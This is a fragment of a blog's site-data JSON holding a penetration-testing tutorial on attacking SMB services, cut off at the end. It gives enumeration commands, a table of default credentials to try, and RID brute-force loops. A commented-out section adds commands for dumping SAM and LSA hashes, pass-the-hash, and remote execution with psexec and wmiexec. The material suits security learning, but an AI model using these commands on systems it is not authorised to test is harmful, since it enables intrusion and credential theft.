urce/images/avatar1.gif","hash":"edcf766dbd8d13ed64801e5bc63ec961d6da3641","modified":1670733560528},{"_id":"source/_posts/smb-port.md","hash":"b44830eaa32bddfb957ba08916ee49f02d87865d","modified":1670732652168},{"_id":"source/images/smbprotocol.png","hash":"8ac3d2f85d15f22ff4505da88ec2f9697ec0734e","modified":1664742033432},{"_id":"source/_posts/.smb-port.md.swp","hash":"236573dfc3a0e1f11880110a765dedbda9a802a1","modified":1664755823260},{"_id":"source/_posts/smb-port.md.save","hash":"692081e9816403cf716d5215f038a6b8092d020c","modified":1670696985820},{"_id":"source/images/coffe.jpg","hash":"2b1fb6459f5cded0481464b60d9a6bb8def56164","modified":1670697009060},{"_id":"source/_posts/coffe-late-attack.md","hash":"02b112a8a0f6d988ab5b42a43cf2c0a04a87a969","modified":1670731268776},{"_id":"source/_posts/.coffe-late-attack.md.swp","hash":"3f1789cf702590a3d0bcbae7ce5675891bd6607c","modified":1670717086220},{"_id":"source/images/network-card.jpg","hash":"5349bec20becdae30d1142e57659c43d0f883e19","modified":1670731142792},{"_id":"source/images/attackcoffelatte.png","hash":"8a4805bb26bff9eab97a2948c21799e3d59cdef2","modified":1670717011696},{"_id":"source/images/caffelate1screenshot.png","hash":"14caf2c73de688d97b0fb57487682a14d27d1362","modified":1670721884828},{"_id":"source/images/caffelate2screenshot.png","hash":"4fb3e70a78b36d37600277dc357a2b923f336d15","modified":1670721884828},{"_id":"source/images/caffelate3screenshot.png","hash":"5e28f03447001b4a871676309effc6cb7a9119b7","modified":1670721884828},{"_id":"source/images/caffelate4screenshot.png","hash":"0dab68946e77703e6f822c761df7d651684d5253","modified":1670721884832}],"Category":[],"Data":[],"Page":[{"title":"Hack the world!","_content":"\n### About me\n\n- I am not an expert in cybersecurity, I am somewhat new in this, let's say I started 4 years ago...\n\n- Anyway, I want to share the knowledge I have, writeups and other hacking stuff in this blog.\n\n- ***keep trying***\n\n","source":"about.md","raw":"---\ntitle: Hack the world!\n---\n\n### About me\n\n- I am not an expert in cybersecurity, I am somewhat new in this, let's say I started 4 years ago...\n\n- Anyway, I want to share the knowledge I have, writeups and other hacking stuff in this blog.\n\n- ***keep trying***\n\n","date":"2022-10-02T19:43:41.924Z","updated":"2022-10-02T19:43:41.924Z","path":"about.html","_id":"cl8rmrapb0000dokc0m6iejbt","comments":1,"layout":"page","content":"<h3 id=\"About-me\"><a href=\"#About-me\" class=\"headerlink\" title=\"About me\"></a>About me</h3><ul>\n<li><p>I am not an expert in cybersecurity, I am somewhat new in this, let’s say I started 4 years ago…</p>\n</li>\n<li><p>Anyway, I want to share the knowledge I have, writeups and other hacking stuff in this blog.</p>\n</li>\n<li><p><em><strong>keep trying</strong></em></p>\n</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"About-me\"><a href=\"#About-me\" class=\"headerlink\" title=\"About me\"></a>About me</h3><ul>\n<li><p>I am not an expert in cybersecurity, I am somewhat new in this, let’s say I started 4 years ago…</p>\n</li>\n<li><p>Anyway, I want to share the knowledge I have, writeups and other hacking stuff in this blog.</p>\n</li>\n<li><p><em><strong>keep trying</strong></em></p>\n</li>\n</ul>\n"}],"Post":[{"title":"SMB Protocol","_content":"\nHave you found that the SMB service is running and you don't know what to do with it?\n\nI am going to show you what this service is and how you can exploit it\n\n![Alt text](/images/smbprotocol.png?raw=true \"SMB-Protocol\")\n\n<!-- more -->\n\n# Introduction\n\nFirst of all, the **Server Message Block** (SMB) is a client-server protocol that regulates access to entire files and directories and other network resources such as:\n- Printers\n- Routers\n- Interfaces released to the network\n\nThe application area is mainly active on *Windows* operating systems, these network services support SMB with older versions, this means that older windows operating systems are perfectly compatible with newer ones.\nHowever, there is a solution that allows the use of SMB on ***Linux and Unix*** distributions via Samba.\n\nThe SMB server can provide some parts (if it allows it) of your local files, such as shares.\nTherefore the part visible to a client is on the one hand independent of the server structure.\nAccess rights are defined by access control lists ***(ACL)***. They can be controlled by attributes such as: \n- Execute\n- Read\n- Full access for individual users or groups of users\n\n***ACLs*** are defined on the basis of shared resources and therefore do not correspond to the rights assigned locally on the server.\n\n# First steps: Enumeration\n\nScan a network searching for hosts:\n\n``` console\n$ nbtscan -r 192.168.0.1/24\n```\n\n# View the SMB server version\nFirst, to look for possible exploits in SMB it is important to know which version is being used. To do this you can use the MSF auxiliary module: \n\n``` console\n$ msfconsole\n\n$ msf6> use auxiliary/scanner/smb/smb_version\n```\n\nOr u can use **this script**:\n\n``` bash\n #!/bin/sh\n #Author: rewardone\n #Description:\n #Requires root or sufficient permissions to use tcpdump.\n # It will listen for the first 7 packets of a null login\n # and will take the SMB version\n #Notes:\n # Sometimes it will not capture or print multiple # lines.\n # lines. It may be necessary to run a second time to succeed.\nif [ -z $1 ]; then echo \"Usage: ./smbver.sh RHOST {RPORT}\" && exit; else rhost=$1; fi\nif [ ! -z $2 ]; then rport=$2; else rport=139; fi\ntcpdump -s0 -n -i tap0 src $rhost and port $rport -A -c 7 2>/dev/null | grep -i \"samba|s.a.m\" | tr -d '.' | grep -oP 'UnixSamba.*[0-9a-z]' | tr -d '{\\n' & echo -n \"$rhost: \" &\necho \"exit\" | smbclient -L $rhost 1>/dev/null 2>/dev/null\necho \"\" && sleep .1\n```\n\n\n# SearchSploit\n\nTo search for possible exploits that are related to SMB protocol you can use this command in msfconsole:\n\n``` console\n$ msfconsole\n\n    Trace program: running\n\n           wake up, Neo...\n        the matrix has you\n      follow the white rabbit.\n\n          knock, knock, Neo.\n\n                        (`.         ,-,\n                        ` `.    ,;' /\n                         `.  ,'/ .'\n                          `. X /.'\n                .-;--''--.._` ` (\n              .'            /   `\n             ,           ` '   Q '\n             ,         ,   `._    \\\n          ,.|         '     `-.;_'\n          :  . `  ;    `  ` --,.._;\n           ' `    ,   )   .'\n              `._ ,  '   /_\n                 ; ,''-,;' ``-\n                  ``-..__``--`\n\n                             https://metasploit.com\n\n\n$ msf6> search type:exploit platform:windows target:2008 smb\nsearchsploit microsoft smb\n```\n\nOr you can use this command, note that you must have installed searchsploit\n\n``` console\n$ searchsploit smb\n```\nMore info: [searchsploit](https://www.exploit-db.com/searchsploit)\n\n# Possible Credentials\n\nSometimes companies leave the smb protocol misconfigured, or don't even configure it at all, and sometimes if they do, they leave very basic credentials, which you can try to use, such as: \n\n| Usernames            | Passwords                               |\n|----------------------|-----------------------------------------|\n| (blank)              | (blank)                                 |\n| guest                | (blank)                                 |\n| Administrator, admin | (blank), password, administrator, admin |\n| arcserve             | arcserve, backup                        |\n| tivoli, tmersrvd     | tivoli, tmersrvd, admin                 |\n| backupexec, backup   | backupexec, backup, arcada              |\n| test, lab, demo      | password, test, lab, demo               |\n\n\n# Some Commands to get more information\n\n``` console\n #Dump interesting information\n$ enum4linux -a [-u \"<username>\" -p \"<passwd>\"] <IP>\n$ enum4linux-ng -A [-u \"<username>\" -p \"<passwd>\"] <IP>\n$ nmap --script \"safe or smb-enum-*\" -p 445 <IP>\n\n #Connect to the rpc\n$ rpcclient -U \"\" -N <IP> #No creds\n$ rpcclient //machine.htb -U domain.local/USERNAME%754d87d42adabcca32bdb34a876cbffb  --pw-nt-hash\n$ #You can use querydispinfo and enumdomusers to query user information\n\n #Dump user information\n$ /usr/share/doc/python3-impacket/examples/samrdump.py -port 139 [[domain/]username[:password]@]<targetName or address>\n$ /usr/share/doc/python3-impacket/examples/samrdump.py -port 445 [[domain/]username[:password]@]<targetName or address>\n\n #Map possible RPC endpoints\n$ /usr/share/doc/python3-impacket/examples/rpcdump.py -port 135 [[domain/]username[:password]@]<targetName or address>\n$ /usr/share/doc/python3-impacket/examples/rpcdump.py -port 139 [[domain/]username[:password]@]<targetName or address>\n$ /usr/share/doc/python3-impacket/examples/rpcdump.py -port 445 [[domain/]username[:password]@]<targetName or address>\n```\n\n# Enumerating LSARPC and SAMR rpcclient\n\nPat of this section was extracted from book \"Network Security Assesment 3rd Edition\"\nYou can use the Samba rpcclient utility to interact with RPC endpoints via named pipes. The following lists commands that you can issue to SAMR, LSARPC, and LSARPC-DS interfaces upon establishing a SMB session (often requiring credentials).\n### Server Info\n- Server Info: **srvinfo**\n### Users enumeration\n- List users: **querydispinfo** and **enumdomusers**\n- Get user details: **queryuser <0xrid>**\n- Get user groups: **queryusergroups <0xrid>**\n- GET SID of a user: **lookupnames <username>**\n- Get users aliases: **queryuseraliases [builtin|domain] <sid>**\n\n``` python\n #Brute-Force users RIDs\nfor i in $(seq 500 1100); do\n    rpcclient -N -U \"\" 10.129.14.128 -c \"queryuser 0x$(printf '%x\\n' $i)\" | grep \"User Name\\|user_rid\\|group_rid\" && echo \"\";\ndone\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n<!---\n# You can also use samrdump.py for this purpose\nGroups enumeration\nList groups: enumdomgroups\nGet group details: querygroup <0xrid>\nGet group members: querygroupmem <0xrid>\nAliasgroups enumeration\nList alias: enumalsgroups <builtin|domain>\nGet members: queryaliasmem builtin|domain <0xrid>\nDomains enumeration\nList domains: enumdomains\nGet SID: lsaquery\nDomain info: querydominfo\nShares enumeration\nEnumerate all available shares: netshareenumall\nInfo about a share: netsharegetinfo <share>\nMore SIDs\nFind SIDs by name: lookupnames <username>\nFind more SIDs: lsaenumsid\nRID cycling (check more SIDs): lookupsids <sid>\nExtra commands\n\nTo understand better how the tools samrdump and rpcdump works you should read Pentesting MSRPC.\nGUI connection from linux\nIn the terminal:\nxdg-open smb://cascade.htb/\nIn file browser window (nautilus, thunar, etc)\nsmb://friendzone.htb/general/\nList shared folders\nIt is always recommended to look if you can access to anything, if you don't have credentials try using null credentials/guest user.\nsmbclient --no-pass -L //<IP> # Null user\nsmbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash\nsmbmap -H <IP> [-P <PORT>] #Null user\nsmbmap -u \"username\" -p \"password\" -H <IP> [-P <PORT>] #Creds\nsmbmap -u \"username\" -p \"<NT>:<LM>\" -H <IP> [-P <PORT>] #Pass-the-Hash\ncrackmapexec smb <IP> -u '' -p '' --shares #Null user\ncrackmapexec smb <IP> -u 'username' -p 'password' --shares #Guest user\ncrackmapexec smb <IP> -u 'username' -H '<HASH>' --shares #Guest user\nConnect/List a shared folder\n#Connect using smbclient\nsmbclient --no-pass //<IP>/<Folder>\nsmbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash\n#Use --no-pass -c 'recurse;ls'  to list recursively with smbclient\n\n#List with smbmap, without folder it list everything\nsmbmap [-u \"username\" -p \"password\"] -R [Folder] -H <IP> [-P <PORT>] # Recursive list\nsmbmap [-u \"username\" -p \"password\"] -r [Folder] -H <IP> [-P <PORT>] # Non-Recursive list\nsmbmap -u \"username\" -p \"<NT>:<LM>\" [-r/-R] [Folder] -H <IP> [-P <PORT>] #Pass-the-Hash\nManually enumerate windows shares and connect to them\nIt may be possible that you are restricted to display any shares of the host machine and when you try to list them it appears as if there aren't any shares to connect to. Thus it might be worth a short to try to manually connect to a share. To enumerate the shares manually you might want to look for responses like NT_STATUS_ACCESS_DENIED and NT_STATUS_BAD_NETWORK_NAME, when using a valid session (e.g. null session or valid credentials). These may indicate whether the share exists and you do not have access to it or the share does not exist at all.\nCommon share names for windows targets are\nC$\nD$\nADMIN$\nIPC$\nPRINT$\nFAX$\nSYSVOL\nNETLOGON\n(Common share names from Network Security Assessment 3rd edition)\nYou can try to connect to them by using the following command\nsmbclient -U '%' -N \\\\\\\\<IP>\\\\<SHARE> # null session to connect to a windows share\nsmbclient -U '<USER>' \\\\\\\\<IP>\\\\<SHARE> # authenticated session to connect to a windows share (you will be prompted for a password)\nor this script (using a null session)\n#/bin/bash\n\nip='<TARGET-IP-HERE>'\nshares=('C$' 'D$' 'ADMIN$' 'IPC$' 'PRINT$' 'FAX$' 'SYSVOL' 'NETLOGON')\n\nfor share in ${shares[*]}; do\n    output=$(smbclient -U '%' -N \\\\\\\\$ip\\\\$share -c '') \n\n    if [[ -z $output ]]; then \n        echo \"[+] creating a null session is possible for $share\" # no output if command goes through, thus assuming that a session was created\n    else\n        echo $output # echo error message (e.g. NT_STATUS_ACCESS_DENIED or NT_STATUS_BAD_NETWORK_NAME)\n    fi\ndone\nexamples\nsmbclient -U '%' -N \\\\\\\\192.168.0.24\\\\im_clearly_not_here # returns NT_STATUS_BAD_NETWORK_NAME\nsmbclient -U '%' -N \\\\\\\\192.168.0.24\\\\ADMIN$ # returns NT_STATUS_ACCESS_DENIED or even gives you a session\nMount a shared folder\nmount -t cifs //x.x.x.x/share /mnt/share\nmount -t cifs -o \"username=user,password=password\" //x.x.x.x/share /mnt/share\nDownload files\nRead previous sections to learn how to connect with credentials/Pass-the-Hash.\n#Search a file and download\nsudo smbmap -R Folder -H <IP> -A <FileName> -q # Search the file in recursive mode and download it inside /usr/share/smbmap\n#Download all\nsmbclient //<IP>/<share>\n> mask \"\"\n> recurse\n> prompt\n> mget *\n#Download everything to current directory\nCommands:\nmask: specifies the mask which is used to filter the files within the directory (e.g. \"\" for all files)\nrecurse: toggles recursion on (default: off)\nprompt: toggles prompting for filenames off (default: on)\nmget: copies all files matching the mask from host to client machine\n(Information from the manpage of smbclient)\nRead Registry\nYou may be able to read the registry using some discovered credentials. Impacket reg.py allows you to try:\nsudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKU -s\nsudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKCU -s\nsudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKLM -s\nLocal users\nEnumerate local users with SID brute-forcing:\nWith Impacket:\nlookupsid.py -no-pass hostname.local\nWith Metasploit:\nuse auxiliary/scanner/smb/smb_lookupsid\nset rhosts hostname.local\nrun\nNote: rpcclient command lookupsids only translates a SID to a username but doesn't allow enumeration via brute-forcing.\nPost Exploitation\nThe default config of a Samba server is usually located in /etc/samba/smb.conf and might have some dangerous configs:\n\nThe command smbstatus gives information about the server and about who is connected.\nAuthenticate using Kerberos\nYou can authenticate to kerberos using the tools smbclient and rpcclient:\nsmbclient --kerberos //ws01win10.domain.com/C$\nrpcclient -k ws01win10.domain.com\nExecute\ncrackmapexec\ncrackmapexec can execute commands abusing any of mmcexec, smbexec, atexec, wmiexec being wmiexec the default method. You can indicate which option you prefer to use with the parameter --exec-method:\napt-get install crackmapexec\n\ncrackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable' #Execute Powershell\ncrackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami #Excute cmd\ncrackmapexec smb 192.168.10.11 -u Administrator -H <NTHASH> -x whoami #Pass-the-Hash\n# Using --exec-method {mmcexec,smbexec,atexec,wmiexec}\n\ncrackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sam #Dump SAM\ncrackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --lsa #Dump LSASS in memmory hashes\ncrackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sessions #Get sessions (\ncrackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --loggedon-users #Get logged-on users\ncrackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --disks #Enumerate the disks\ncrackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --users #Enumerate users\ncrackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --groups # Enumerate groups\ncrackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --local-groups # Enumerate local groups\ncrackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --pass-pol #Get password policy\ncrackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --rid-brute #RID brute\npsexec/smbexec\n\nBoth options will create a new service (using \\pipe\\svcctl via SMB) in the victim machine and use it to execute something (psexec will upload an executable file to ADMIN$ share and smbexec will point to cmd.exe/powershell.exe and put in the arguments the payload --file-less technique--).\nMore info about psexec and smbexec.\nIn kali it is located on /usr/share/doc/python3-impacket/examples/\n#If no password is provided, it will be prompted\n./psexec.py [[domain/]username[:password]@]<targetName or address>\n./psexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash\npsexec \\\\192.168.122.66 -u Administrator -p 123456Ww\npsexec \\\\192.168.122.66 -u Administrator -p q23q34t34twd3w34t34wtw34t # Use pass the hash\nUsing parameter-k you can authenticate against kerberos instead of NTLM\nwmiexec/dcomexec\nStealthily execute a command shell without touching the disk or running a new service using DCOM via port 135.\nIn kali it is located on /usr/share/doc/python3-impacket/examples/\n#If no password is provided, it will be prompted\n./wmiexec.py [[domain/]username[:password]@]<targetName or address> #Prompt for password\n./wmiexec.py -hashes LM:NT administrator@10.10.10.103 #Pass-the-Hash\n#You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompted\nUsing parameter-k you can authenticate against kerberos instead of NTLM\n#If no password is provided, it will be prompted\n./dcomexec.py [[domain/]username[:password]@]<targetName or address>\n./dcomexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash\n#You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompted\nAtExec\nExecute commands via the Task Scheduler (using \\pipe\\atsvc via SMB).\nIn kali it is located on /usr/share/doc/python3-impacket/examples/\n./atexec.py [[domain/]username[:password]@]<targetName or address> \"command\"\n./atexec.py -hashes <LM:NT> administrator@10.10.10.175 \"whoami\"\nImpacket reference\nhttps://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/\nBruteforce users credentials\nThis is not recommended, you could block an account if you exceed the maximum allowed tries\nnmap --script smb-brute -p 445 <IP>\nridenum.py <IP> 500 50000 /root/passwds.txt #Get usernames bruteforcing that rids and then try to bruteforce each user name\nSMB relay attack\nThis attack uses the Responder toolkit to capture SMB authentication sessions on an internal network, and relays them to a target machine. If the authentication session is successful, it will automatically drop you into a system shell.\nMore information about this attack here.\n-->\n\n\n# Blog incomplete, working on it :)\n","source":"_posts/smb-port.md","raw":"---\ntitle: SMB Protocol\n---\n\nHave you found that the SMB service is running and you don't know what to do with it?\n\nI am going to show you what this service is and how you can exploit it\n\n![Alt text](/images/smbprotocol.png?raw=true \"SMB-Protocol\")\n\n<!-- more -->\n\n# Introduction\n\nFirst of all, the **Server Message Block** (SMB) is a client-server protocol that regulates access to entire files and directories and other network resources such as:\n- Printers\n- Routers\n- Interfaces released to the network\n\nThe application area is mainly active on *Windows* operating systems, these network services support SMB with older versions, this means that older windows operating systems are perfectly compatible with newer ones.\nHowever, there is a solution that allows the use of SMB on ***Linux and Unix*** distributions via Samba.\n\nThe SMB server can provide some parts (if it allows it) of your local files, such as shares.\nTherefore the part visible to a client is on the one hand independent of the server structure.\nAccess rights are defined by access control lists ***(ACL)***. They can be controlled by attributes such as: \n- Execute\n- Read\n- Full access for individual users or groups of users\n\n***ACLs*** are defined on the basis of shared resources and therefore do not correspond to the rights assigned locally on the server.\n\n# First steps: Enumeration\n\nScan a network searching for hosts:\n\n``` console\n$ nbtscan -r 192.168.0.1/24\n```\n\n# View the SMB server version\nFirst, to look for possible exploits in SMB it is important to know which version is being used. To do this you can use the MSF auxiliary module: \n\n``` console\n$ msfconsole\n\n$ msf6> use auxiliary/scanner/smb/smb_version\n```\n\nOr u can use **this script**:\n\n``` bash\n #!/bin/sh\n #Author: rewardone\n #Description:\n #Requires root or sufficient permissions to use tcpdump.\n # It will listen for the first 7 packets of a null login\n # and will take the SMB version\n #Notes:\n # Sometimes it will not capture or print multiple # lines.\n # lines. It may be necessary to run a second time to succeed.\nif [ -z $1 ]; then echo \"Usage: ./smbver.sh RHOST {RPORT}\" && exit; else rhost=$1; fi\nif [ ! -z $2 ]; then rport=$2; else rport=139; fi\ntcpdump -s0 -n -i tap0 src $rhost and port $rport -A -c 7 2>/dev/null | grep -i \"samba|s.a.m\" | tr -d '.' | grep -oP 'UnixSamba.*[0-9a-z]' | tr -d '{\\n' & echo -n \"$rhost: \" &\necho \"exit\" | smbclient -L $rhost 1>/dev/null 2>/dev/null\necho \"\" && sleep .1\n```\n\n\n# SearchSploit\n\nTo search for possible exploits that are related to SMB protocol you can use this command in msfconsole:\n\n``` console\n$ msfconsole\n\n    Trace program: running\n\n           wake up, Neo...\n        the matrix has you\n      follow the white rabbit.\n\n          knock, knock, Neo.\n\n                        (`.         ,-,\n                        ` `.    ,;' /\n                         `.  ,'/ .'\n                          `. X /.'\n                .-;--''--.._` ` (\n              .'            /   `\n             ,           ` '   Q '\n             ,         ,   `._    \\\n          ,.|         '     `-.;_'\n          :  . `  ;    `  ` --,.._;\n           ' `    ,   )   .'\n              `._ ,  '   /_\n                 ; ,''-,;' ``-\n                  ``-..__``--`\n\n                             https://metasploit.com\n\n\n$ msf6> search type:exploit platform:windows target:2008 smb\nsearchsploit microsoft smb\n```\n\nOr you can use this command, note that you must have installed searchsploit\n\n``` console\n$ searchsploit smb\n```\nMore info: [searchsploit](https://www.exploit-db.com/searchsploit)\n\n# Possible Credentials\n\nSometimes companies leave the smb protocol misconfigured, or don't even configure it at all, and sometimes if they do, they leave very basic credentials, which you can try to use, such as: \n\n| Usernames            | Passwords                               |\n|----------------------|-----------------------------------------|\n| (blank)              | (blank)                                 |\n| guest                | (blank)                                 |\n| Administrator, admin | (blank), password, administrator, admin |\n| arcserve             | arcserve, backup                        |\n| tivoli, tmersrvd     | tivoli, tmersrvd, admin                 |\n| backupexec, backup   | backupexec, backup, arcada              |\n| test, lab, demo      | password, test, lab, demo               |\n\n\n# Some Commands to get more information\n\n``` console\n #Dump interesting information\n$ enum4linux -a [-u \"<username>\" -p \"<passwd>\"] <IP>\n$ enum4linux-ng -A [-u \"<username>\" -p \"<passwd>\"] <IP>\n$ nmap --script \"safe or smb-enum-*\" -p 445 <IP>\n\n #Connect to the rpc\n$ rpcclient -U \"\" -N <IP> #No creds\n$ rpcclient //machine.htb -U domain.local/USERNAME%754d87d42adabcca32bdb34a876cbffb  --pw-nt-hash\n$ #You can use querydispinfo and enumdomusers to query user information\n\n #Dump user information\n$ /usr/share/doc/python3-impacket/examples/samrdump.py -port 139 [[domain/]username[:password]@]<targetName or address>\n$ /usr/share/doc/python3-impacket/examples/samrdump.py -port 445 [[domain/]username[:password]@]<targetName or address>\n\n #Map possible RPC endpoints\n$ /usr/share/doc/python3-impacket/examples/rpcdump.py -port 135 [[domain/]username[:password]@]<targetName or address>\n$ /usr/share/doc/python3-impacket/examples/rpcdump.py -port 139 [[domain/]username[:password]@]<targetName or address>\n$ /usr/share/doc/python3-impacket/examples/rpcdump.py -port 445 [[domain/]username[:password]@]<targetName or address>\n```\n\n# Enumerating LSARPC and SAMR rpcclient\n\nPat of this section was extracted from book \"Network Security Assesment 3rd Edition\"\nYou can use the Samba rpcclient utility to interact with RPC endpoints via named pipes. The following lists commands that you can issue to SAMR, LSARPC, and LSARPC-DS interfaces upon establishing a SMB session (often requiring credentials).\n### Server Info\n- Server Info: **srvinfo**\n### Users enumeration\n- List users: **querydispinfo** and **enumdomusers**\n- Get user details: **queryuser <0xrid>**\n- Get user groups: **queryusergroups <0xrid>**\n- GET SID of a user: **lookupnames <username>**\n- Get users aliases: **queryuseraliases [builtin|domain] <sid>**\n\n``` python\n #Brute-Force users RIDs\nfor i in $(seq 500 1100); do\n    rpcclient -N -U \"\" 10.129.14.128 -c \"queryuser 0x$(printf '%x\\n' $i)\" | grep \"User Name\\|user_rid\\|group_rid\" && echo \"\";\ndone\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n<!---\n# You can also use samrdump.py for this purpose\nGroups enumeration\nList groups: enumdomgroups\nGet group details: querygroup <0xrid>\nGet group members: querygroupmem <0xrid>\nAliasgroups enumeration\nList alias: enumalsgroups <builtin|domain>\nGet members: queryaliasmem builtin|domain <0xrid>\nDomains enumeration\nList domains: enumdomains\nGet SID: lsaquery\nDomain info: querydominfo\nShares enumeration\nEnumerate all available shares: netshareenumall\nInfo about a share: netsharegetinfo <share>\nMore SIDs\nFind SIDs by name: lookupnames <username>\nFind more SIDs: lsaenumsid\nRID cycling (check more SIDs): lookupsids <sid>\nExtra commands\n\nTo understand better how the tools samrdump and rpcdump works you should read Pentesting MSRPC.\nGUI connection from linux\nIn the terminal:\nxdg-open smb://cascade.htb/\nIn file browser window (nautilus, thunar, etc)\nsmb://friendzone.htb/general/\nList shared folders\nIt is always recommended to look if you can access to anything, if you don't have credentials try using null credentials/guest user.\nsmbclient --no-pass -L //<IP> # Null user\nsmbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash\nsmbmap -H <IP> [-P <PORT>] #Null user\nsmbmap -u \"username\" -p \"password\" -H <IP> [-P <PORT>] #Creds\nsmbmap -u \"username\" -p \"<NT>:<LM>\" -H <IP> [-P <PORT>] #Pass-the-Hash\ncrackmapexec smb <IP> -u '' -p '' --shares #Null user\ncrackmapexec smb <IP> -u 'username' -p 'password' --shares #Guest user\ncrackmapexec smb <IP> -u 'username' -H '<HASH>' --shares #Guest user\nConnect/List a shared folder\n#Connect using smbclient\nsmbclient --no-pass //<IP>/<Folder>\nsmbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash\n#Use --no-pass -c 'recurse;ls'  to list recursively with smbclient\n\n#List with smbmap, without folder it list everything\nsmbmap [-u \"username\" -p \"password\"] -R [Folder] -H <IP> [-P <PORT>] # Recursive list\nsmbmap [-u \"username\" -p \"password\"] -r [Folder] -H <IP> [-P <PORT>] # Non-Recursive list\nsmbmap -u \"username\" -p \"<NT>:<LM>\" [-r/-R] [Folder] -H <IP> [-P <PORT>] #Pass-the-Hash\nManually enumerate windows shares and connect to them\nIt may be possible that you are restricted to display any shares of the host machine and when you try to list them it appears as if there aren't any shares to connect to. Thus it might be worth a short to try to manually connect to a share. To enumerate the shares manually you might want to look for responses like NT_STATUS_ACCESS_DENIED and NT_STATUS_BAD_NETWORK_NAME, when using a valid session (e.g. null session or valid credentials). These may indicate whether the share exists and you do not have access to it or the share does not exist at all.\nCommon share names for windows targets are\nC$\nD$\nADMIN$\nIPC$\nPRINT$\nFAX$\nSYSVOL\nNETLOGON\n(Common share names from Network Security Assessment 3rd edition)\nYou can try to connect to them by using the following command\nsmbclient -U '%' -N \\\\\\\\<IP>\\\\<SHARE> # null session to connect to a windows share\nsmbclient -U '<USER>' \\\\\\\\<IP>\\\\<SHARE> # authenticated session to connect to a windows share (you will be prompted for a password)\nor this script (using a null session)\n#/bin/bash\n\nip='<TARGET-IP-HERE>'\nshares=('C$' 'D$' 'ADMIN$' 'IPC$' 'PRINT$' 'FAX$' 'SYSVOL' 'NETLOGON')\n\nfor share in ${shares[*]}; do\n    output=$(smbclient -U '%' -N \\\\\\\\$ip\\\\$share -c '') \n\n    if [[ -z $output ]]; then \n        echo \"[+] creating a null session is possible for $share\" # no output if command goes through, thus assuming that a session was created\n    else\n        echo $output # echo error message (e.g. NT_STATUS_ACCESS_DENIED or NT_STATUS_BAD_NETWORK_NAME)\n    fi\ndone\nexamples\nsmbclient -U '%' -N \\\\\\\\192.168.0.24\\\\im_clearly_not_here # returns NT_STATUS_BAD_NETWORK_NAME\nsmbclient -U '%' -N \\\\\\\\192.168.0.24\\\\ADMIN$ # returns NT_STATUS_ACCESS_DENIED or even gives you a session\nMount a shared folder\nmount -t cifs //x.x.x.x/share /mnt/share\nmount -t cifs -o \"username=user,password=password\" //x.x.x.x/share /mnt/share\nDownload files\nRead previous sections to learn how to connect with credentials/Pass-the-Hash.\n#Search a file and download\nsudo smbmap -R Folder -H <IP> -A <FileName> -q # Search the file in recursive mode and download it inside /usr/share/smbmap\n#Download all\nsmbclient //<IP>/<share>\n> mask \"\"\n> recurse\n> prompt\n> mget *\n#Download everything to current directory\nCommands:\nmask: specifies the mask which is used to filter the files within the directory (e.g. \"\" for all files)\nrecurse: toggles recursion on (default: off)\nprompt: toggles prompting for filenames off (default: on)\nmget: copies all files matching the mask from host to client machine\n(Information from the manpage of smbclient)\nRead Registry\nYou may be able to read the registry using some discovered credentials. Impacket reg.py allows you to try:\nsudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKU -s\nsudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKCU -s\nsudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKLM -s\nLocal users\nEnumerate local users with SID brute-forcing:\nWith Impacket:\nlookupsid.py -no-pass hostname.local\nWith Metasploit:\nuse auxiliary/scanner/smb/smb_lookupsid\nset rhosts hostname.local\nrun\nNote: rpcclient command lookupsids only translates a SID to a username but doesn't allow enumeration via brute-forcing.\nPost Exploitation\nThe default config of a Samba server is usually located in /etc/samba/smb.conf and might have some dangerous configs:\n\nThe command smbstatus gives information about the server and about who is connected.\nAuthenticate using Kerberos\nYou can authenticate to kerberos using the tools smbclient and rpcclient:\nsmbclient --kerberos //ws01win10.domain.com/C$\nrpcclient -k 